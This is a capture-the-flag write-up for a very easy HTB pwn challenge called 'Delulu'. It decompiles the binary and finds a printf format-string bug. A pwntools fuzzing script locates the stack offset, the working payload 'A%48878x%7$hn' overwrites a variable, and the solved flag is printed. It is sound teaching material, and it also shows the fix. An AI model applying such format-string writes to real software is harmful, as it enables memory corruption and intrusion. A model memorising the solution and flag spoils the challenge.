# Delulu

## Description

> HALT! Recognition protocol initiated. Please present your face for scanning.
>
> [Attached file](./challenge)

Tags: _Pwn_ \
Difficulty: _very easy_ \
Points: _300_

## Recognition phase

The first step for all challenges is to perform recognition tasks to assess the functionality and security posture of the application.

```
$ file delulu
delulu: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=edae8c8bd5153e13fa60aa00f53071bb7b9a122f, for GNU/Linux 3.2.0, not stripped
```

```
$ checksec delulu
[*] '/home/jovenoven/Downloads/ctf/cyberApocalypse2024_HTB/pwn/delulu/delulu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```
Decompiling the binary with `Ghidra`:
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void delulu(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to deceive the robot, here\'s your new identity: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
In summary, we aim to execute the `delulu()` function, which prints the flag. This function is executed when the variable `local_48` equals `0x1337beef`



## Finding the bug

We can identify the bug by analyzing the code and dynamically testing the binary:

A `Buffer Overflow (BOF)` bug exists because the variable `local_38` is 8 bytes long, but we can write up to 31 bytes to it. However, upon examining the stack layout provided by `Ghidra` for the `main()` function, we observe that the overwritten values are `local_30`, `local_28`, and `local_10`, rather than the return address or `local_48`, the variable we intend to overwrite. Therefore, we can rule out Buffer Overflow.

```
******************************************
*               FUNCTION                 *
******************************************
                undefined main()
undefined         AL:1           <RETURN>
undefined8        Stack[-0x10]:8 local_10
                                         
undefined8        Stack[-0x20]:8 local_20
undefined8        Stack[-0x28]:8 local_28
undefined8        Stack[-0x30]:8 local_30
undefined8        Stack[-0x38]:8 local_38
                                         
                                         
undefined8        Stack[-0x40]:8 local_40
undefined8        Stack[-0x48]:8 local_48
```

2. Testing `String Format Vulnerability` by inserting the printf format specifier `%p` 

```
$ ./delulu

...

Try to deceive it by changing your ID.

>> %p %p %p %p

[!] Checking.. 0x7ffcbc2c1090 (nil) 0x7f8b15413887 0x10

[-] ALERT ALERT ALERT ALERT

```
The program does not display our input but instead prints stack pointers. This behavior indicates that the program is vulnerable to String Format Vulnerability, a fact corroborated by the code itself. The user input is directly passed to the printf() function without a corresponding format specifier, which poses a security risk. It should have been written as follows:
```c
printf("%s", (char *)&local_38);
```

## Exploitation phase

To trigger the execution of the ``delulu()`` function, we must modify the value of ``local_48`` from ``0x1337babe`` to ``0x1337beef``. Exploiting the String Format Vulnerability allows us to overwrite memory values, including those referenced by variables on the stack. By identifying the offset in the stack of the ``local_40`` variable, which holds the address of our target ``local_48``, we can achieve this. The offset was determined using this fuzzing script:

```py
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('delulu', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print as a string the value
        # pointed to by the second pointer in the stack
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        p.recvuntil(b'.. ')
        result = p.recvuntil(b'\n')
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```

```
$ python fuzz.py                                                               
1: b'\n'
2: b'(null)\n'
3: b'H=\n'
7: b'\xbe\xba7\x13\n'

...
```

The value ``0x1337babe`` is located at the 7th offset (displayed in little-endian byte format). With this information, we are now prepared to craft our final exploit:
```
A%48878x%7$hn
```
The format specifier ``%7$hn`` in the printf function instructs it to overwrite the least significant 2 bytes of the value pointed to by the pointer at offset 7. In this context, the value written is ``0xbeef``, which corresponds to the length of the output produced by the first part of our exploit ``A%48878x``. This initial part prints the argument 'A' padded with at least 48878 characters, effectively changing the value of ``local_48`` form ``0x1337babe`` to ``0x1337beef``.

Flag `HTB{m45t3r_0f_d3c3pt10n}`
